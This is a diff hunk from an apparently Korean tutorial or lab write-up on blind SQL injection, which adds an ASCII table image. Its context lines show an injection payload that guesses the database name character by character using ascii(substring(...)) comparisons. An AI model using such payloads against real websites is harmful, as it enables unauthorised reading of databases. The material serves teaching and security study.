@@ -124,6 +124,8 @@ ascii 코드 115번 = s
 
 s
 ```
+![ASCII코드표](https://user-images.githubusercontent.com/106296883/235738180-c9b6faf3-aaa7-417c-a4cc-2cb05559282a.png)
+
 이런 식으로 계속해서 찾아가다보면 
 
 mario'+and+(ascii(substring((select+database()),1,1))=115)+and'1'='1   
